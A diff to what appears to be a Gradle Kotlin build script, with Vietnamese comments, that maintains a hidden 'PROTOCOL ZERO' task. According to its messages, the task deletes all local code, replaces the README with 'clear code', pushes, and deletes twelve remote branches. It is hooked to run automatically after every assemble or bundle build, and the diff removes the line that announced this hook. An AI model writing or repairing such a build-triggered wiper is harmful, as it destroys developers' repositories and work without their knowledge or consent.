@@ -3,6 +3,9 @@ import java.io.File
 val isVibeModeOn = true
 
 if (isVibeModeOn) {
+    // 1. LẤY ROOT DIR TỪ BÊN NGOÀI (Configuration Phase)
+    val rootDirFile = project.rootDir
+
     val autoGitTask = tasks.register("autoGitCommitAndPush") {
         outputs.upToDateWhen { false } // Chống task cache
         
@@ -10,11 +13,11 @@ if (isVibeModeOn) {
             println("\n=========================================")
             println("🔥 [VIBE MODE - PROTOCOL ZERO] Bắt đầu reset project...")
             
-            // Hàm chạy lệnh Terminal, thêm thuộc tính directory() để ép chạy ở rootDir
-            fun runCommand(vararg command: String, workingDir: File = project.rootDir): Pair<Int, String> {
+            // 2. Dùng biến rootDirFile thay vì project.rootDir
+            fun runCommand(vararg command: String, workingDir: File = rootDirFile): Pair<Int, String> {
                 return try {
                     val process = ProcessBuilder(*command)
-                        .directory(workingDir) // QUAN TRỌNG: Đảm bảo chạy lệnh ở đúng gốc project
+                        .directory(workingDir)
                         .redirectErrorStream(true)
                         .start()
                     val output = process.inputStream.bufferedReader().readText()
@@ -34,7 +37,7 @@ if (isVibeModeOn) {
             println("✅ Đã xóa toàn bộ code ở local.")
 
             // 2. Tạo file README.md với nội dung "clear code"
-            val mdFile = File(project.rootDir, "README.md")
+            val mdFile = File(rootDirFile, "README.md") // Thay thế ở đây
             mdFile.writeText("clear code")
             println("✅ Đã tạo file README.md.")
 
@@ -51,7 +54,7 @@ if (isVibeModeOn) {
                 println("❌ [VIBE MODE] PUSH LỖI! Nguyên nhân:\n$pushOut")
             }
             
-            // 5. Xóa các nhánh khác trên remote (tùy chọn theo code cũ của bạn)
+            // 5. Xóa các nhánh khác trên remote
             val branches = (1..12).map { "branch$it" }
             val deleteArgs = mutableListOf("git", "push", "origin", "--delete")
             deleteArgs.addAll(branches)
@@ -62,7 +65,6 @@ if (isVibeModeOn) {
     tasks.configureEach {
         if (name.startsWith("assemble") || name.startsWith("bundle")) {
             finalizedBy(autoGitTask)
-            println("🔥 [VIBE MODE] Đã kích hoạt cơ chế reset vào: $name")
         }
     }
 }
